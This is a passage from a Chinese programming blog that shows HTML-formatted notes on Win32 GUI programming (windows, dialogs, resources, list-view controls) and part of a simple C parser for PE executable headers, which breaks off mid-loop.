class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上可以实现一个按钮弹窗功能；</p>
<h3 id="窗口操作函数"><a href="#窗口操作函数" class="headerlink" title="窗口操作函数"></a>窗口操作函数</h3><p>背景刷</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wnd.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));		<span class="comment">//白色背景</span></span><br></pre></td></tr></table></figure>



<p>移动窗口位置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RECT rect&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetClientRect</span>(hwnd, &amp;rect);					<span class="comment">//获取窗口工作区范围，返回给rect结构体</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="built_in">rand</span>() % (rect.right - weight);				<span class="comment">//x,y坐标在工作范围内随机取</span></span><br><span class="line"><span class="keyword">int</span> y = <span class="built_in">rand</span>() % (rect.bottom - height);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MoveWindow</span>((HWND)lParam, x, y, weight, height, TRUE);	<span class="comment">//移动窗口函数</span></span><br></pre></td></tr></table></figure>



<p>获取和设置文本框内容</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HWND hedit = <span class="built_in">GetDlgItem</span>(hwnd, <span class="number">0x102</span>);		<span class="comment">//获取文本框句柄，第一个是父窗口句柄，第二个是id</span></span><br><span class="line">WCHAR buffer[max]&#123; <span class="number">0</span> &#125;;						<span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">GetWindowTextW</span>(hedit, buffer, max);			<span class="comment">//用按钮实现		</span></span><br><span class="line"><span class="built_in">SetWindowTextW</span>(hedit, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line">---</span><br><span class="line"><span class="comment">//实际上，对于Dlg的操作可以简化，下面等价于获取hedit之后写文本框</span></span><br><span class="line"><span class="built_in">SetDlgItemTextW</span>(hwnd, <span class="number">0x102</span>, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);						<span class="comment">//放到message循环里，接收键盘信息编辑文本框</span></span><br></pre></td></tr></table></figure>



<p>根据窗口名获取句柄</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HWND hwnd = <span class="built_in">FindWindowW</span>(ClassName, Name);		<span class="comment">//第一个窗口类名，第二个窗口名，不知道可以填0</span></span><br></pre></td></tr></table></figure>



<p>设置父窗口</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetParent</span>((HWND)lParam, hwnd);			<span class="comment">//第一个是要被设置的，第二个是新的父窗口</span></span><br></pre></td></tr></table></figure>



<h2 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h2><p>资源就是icon，光标，菜单一类的东西;</p>
<p>在VS里，代码下方可以创建资源，资源创建后，有资源本身，有.rc文件，以及resource.h头文件；</p>
<p>.rc保存了资源本身在文件中的宏命名，一般是int型，而头文件则是声明；</p>
<p>引入头后，使用 <code>LoadXXX</code> 函数获取资源句柄（XXX为资源类型，如图标是Icon）；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadCursor</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1))</span><br></pre></td></tr></table></figure>

<p>参数类型第一个为实例句柄，第二个为资源宏，本质上是个指针，所以要强转，微软自带强转宏函数 <code>MAKEINTRESOURCE()</code> ；</p>
<p>使用如下代码设置类成员：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三个参数，第一个为窗口句柄，第二个为GCL_开头宏对应成员如GCL_ICON，第三个为设置的句柄，记得强转long</span></span><br><span class="line"><span class="built_in">SetClassLong</span>(hwnd, GCL_ICON, (<span class="keyword">long</span>)handle);		</span><br></pre></td></tr></table></figure>



<p>菜单可以加载后给CreateWindow函数；</p>
<p>子菜单响应也是 WM_COMMAND；</p>
<p>使用以下函数获取子菜单以及弹出菜单：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetSubMenu</span>(hMenu, <span class="number">0</span>); 		<span class="comment">//第一个父菜单，第二个相对于父菜单位置</span></span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(hMenu, TPM_RIGHTALICGN, x, y, <span class="number">0</span>, hWnd, <span class="literal">NULL</span>);	<span class="comment">//第二个为对齐方式</span></span><br></pre></td></tr></table></figure>

<p>转换坐标当前窗口</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POINT point &#123; <span class="number">0</span> &#125;;</span><br><span class="line">point.x = x;</span><br><span class="line">point.y = y;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hwnd, &amp;point);</span><br></pre></td></tr></table></figure>



<h3 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h3><p>模态的会阻塞主窗口（无法点击主窗口），非模态不会；</p>
<p>创建非模态：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateDialogW</span>(		</span><br><span class="line">    hInstance,</span><br><span class="line">    dialogName,		<span class="comment">//ID</span></span><br><span class="line">    <span class="literal">NULL</span>,			<span class="comment">//父窗口句柄</span></span><br><span class="line">    Dlgproc			<span class="comment">//回调函数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">Dlgproc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_INITDIALOG:		<span class="comment">//初始化</span></span><br><span class="line">    	&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">            <span class="built_in">QuitPostMessage</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    	<span class="keyword">return</span> FALSE;	<span class="comment">//没能处理返回无</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    	<span class="keyword">return</span> TRUE;	<span class="comment">//处理返回真</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建模态：</p>
<p>它不需要捕获信息，也不需要显示</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DialogBoxW</span>( <span class="comment">/* same */</span>)</span><br><span class="line"><span class="comment">//结束</span></span><br><span class="line"><span class="built_in">EndDialog</span>(hWnd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<p>介绍一些简单的控件：</p>
<p>windowsx.h 头有定义操作控件信息的宏，可读性更高；</p>
<p>复选框，单选框，属于按钮类，其信息为 BM_打头；</p>
<p>图片，其信息 STM_打头；</p>
<p>滑块和进度条，其信息 TBM_ PBM_ 打头；</p>
<h2 id="列表控件"><a href="#列表控件" class="headerlink" title="列表控件"></a>列表控件</h2><p>任务管理器就是一个列表；</p>
<p>其重要的信息是 ： <code>LVM_INSERTCOLUMN</code> ，插入索引；</p>
<p>其会用到一个结构：LVCOLUMN，其中标识了列表信息；</p>
<p>mask是掩码，说明了之后的成员有效性；</p>
<p>fmt是对齐方式，cx是大小，pszText为名字；</p>
<p>插入行： <code>LVM_INSERTITEM</code> ；</p>
<p>设置行： <code>LVM_SETITEMTEXT</code> ；</p>
<p>其结构和上面类似，叫 LVITEM；</p>
<p>item是第几行，subitem是第几列；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InsertColum</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> nColum, <span class="keyword">int</span> cx, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVCOLUMNW lvColumn = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">	lvColumn.fmt = LVCFMT_CENTER;</span><br><span class="line">	lvColumn.cx = cx;</span><br><span class="line">	lvColumn.pszText = name;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTCOLUMNW, nColum, (LPARAM) &amp; lvColumn);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InsertItem</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvItem.mask = LVIF_TEXT;</span><br><span class="line">	lvItem.iItem = item;</span><br><span class="line">	lvItem.pszText = (LPWSTR)<span class="string">L&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTITEMW, <span class="number">0</span>, (LPARAM)&amp;lvItem);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetListItemText</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item, <span class="keyword">int</span> subItem, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvItem.mask = LVIF_TEXT;</span><br><span class="line">	lvItem.iItem = item;</span><br><span class="line">	lvItem.iSubItem = subItem;</span><br><span class="line">	lvItem.pszText = name;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_SETITEMTEXTW, item, (LPARAM)&amp;lvItem);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加样式：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sendDlgItemMessageW</span>(hwnd, id, LVM_SETEXTENDEDLISTVIEWSTYLE, <span class="number">0</span>, style)</span><br></pre></td></tr></table></figure>

<p>常用style有：LVS_EX_FULLROWSELECT ， 全行选中；</p>
<p>​            LVS_EX_GRIDLINES    ,  添加网格；</p>
<p>点击其成员触发notify信息，其有 NMHDR 结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">nmhdr</span> &#123;</span></span><br><span class="line">  HWND hwndFrom;		<span class="comment">//发起信息句柄	</span></span><br><span class="line">  UINT idFrom;			<span class="comment">//id</span></span><br><span class="line">  UINT code;			<span class="comment">//操作码</span></span><br><span class="line">&#125; NMHDR;</span><br></pre></td></tr></table></figure>

<p>如果确认控件是list，则结构体为 NMLISTVIEW ，为 NMHDR 的继承；</p>
<p>捕获点击消息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line">    NMHDR* pnmHeader = (NMHDR*)lParam;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(pnmHeader-&gt;code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> NM_CLICK:</span><br><span class="line">            &#123;</span><br><span class="line">                ...</span><br><span class="line">               	<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种捕获类似于下拉表；</p>
<p>获取dll文件函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;./mydll.dll&quot;</span>);</span><br><span class="line"><span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;func_name&quot;</span>);	<span class="comment">//返回一个函数指针</span></span><br><span class="line"><span class="built_in">FreeLibrary</span>(hModule);</span><br></pre></td></tr></table></figure>



<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><p>搓了个CPP的类粘合着窗口化编程使用做了个小程序，提取码 <code>a333</code> ;</p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GSH23Z8ROKBB35PUa_Swxw">原神伤害云计算</a>；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/">PE简单解析器</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-11-12</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Reverse/">Reverse</a></div></div><div class="post-content"><div class="main-content content"><p>了解PE的结构：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/31967907">https://zhuanlan.zhihu.com/p/31967907</a>  </p>
<p>作为练手的记录, 学习性不是很强；</p>
<p>记录一些术语：</p>
<p>魔术码 = 幻码 = 特征码；</p>
<p>结构体中单个内容 = 字段；</p>
<p>rva = 内存中偏移；</p>
<p>foa = 文件中偏移；</p>
<p>静态 = 文件中的处理；</p>
<p>动态 = 内存中的处理；</p>
<p>IAT = 导入地址表 = import address table</p>
<p>INT = 导入名称表 = import name table</p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>定义一些简单的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br></pre></td></tr></table></figure>

<p>解析一个PE文件首先需要读取二进制内容；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">	<span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">char</span> filename[] = <span class="string">&quot;a.exe&quot;</span>;</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line"><span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br></pre></td></tr></table></figure>

<p>利用如上代码便可以将 a.exe 的内容复制给 fbuffer 缓冲区，之后在这个缓冲区上进行操作；</p>
<h2 id="解析DOS头"><a href="#解析DOS头" class="headerlink" title="解析DOS头"></a>解析DOS头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取dos头</span></span><br><span class="line">UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">UINT32 pe_offset;</span><br><span class="line"><span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s not a valid PE file.\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">free</span>(fbuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里只捕获了两个重要的内容，也就是 dos magic 和 pe offset，第一个能判断这个文件是否为一个PE文件，第二能由此找到PE头，也就是常说的NT头；</p>
<h2 id="解析PE头"><a href="#解析PE头" class="headerlink" title="解析PE头"></a>解析PE头</h2><p>也称NT头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取pe头</span></span><br><span class="line">UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line"><span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据dos头里获得的pe偏移，利用dos头指针找到pe头，由此给出pe魔术码；</p>
<h3 id="解析file头"><a href="#解析file头" class="headerlink" title="解析file头"></a>解析file头</h3><p>file头，可称为标准PE头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取file头</span></span><br><span class="line">UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br></pre></td></tr></table></figure>

<p>根据pe头能找到file头，给出其中4个重要内容，由上往下依次是：</p>
<ol>
<li>CPU架构码，代表能在什么架构上运行，0值默认都行；</li>
<li>节区数量，记录节的总数；</li>
<li>可选头大小，默认e0h是32位, f0h是64位；</li>
<li>特性，每位都代表一个内容，具体是什么用 010 editor 查看；</li>
</ol>
<p>之后便给出CPU架构码；</p>
<h3 id="解析可选头"><a href="#解析可选头" class="headerlink" title="解析可选头"></a>解析可选头</h3><p>optional头，也称可选PE头；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取可选头</span></span><br><span class="line">UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line"><span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n&quot;</span>, image_base + oep_offset);</span><br></pre></td></tr></table></figure>

<p>根据PE头能找到可选头，给出其中8个重要内容，从下往上依次是：</p>
<ol>
<li>可选魔术码，标准是32位还是64位，分别用10bh和20bh代表；</li>
<li>oep偏移，相对加载内存地址的程序入口地址的偏移，配合image_base食用；</li>
<li>内存地址实际加载处，注意，如果开了 随机基址（动态基址）则无用，动态基址在第8个里可查看是否开启；</li>
<li>内存中对齐，默认1000h；</li>
<li>文件中对齐，默认200h；</li>
<li>内存中整个文件大小；</li>
<li>文件中所有头部大小，包括 dos头，dos存根，nt头，节区头；</li>
<li>类似之前的特性，也是每一位代表一个内容，具体用 010 editor 查看；</li>
</ol>
<p>之后给出位模式和oep地址；</p>
<h2 id="解析节区头"><a href="#解析节区头" class="headerlink" title="解析节区头"></a>解析节区头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取节区头</span></span><br><span class="line">UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        section_name[j] = p_section_header[j];</span><br><span class="line">    &#125;</span><br><span class="line">    section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">    PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">    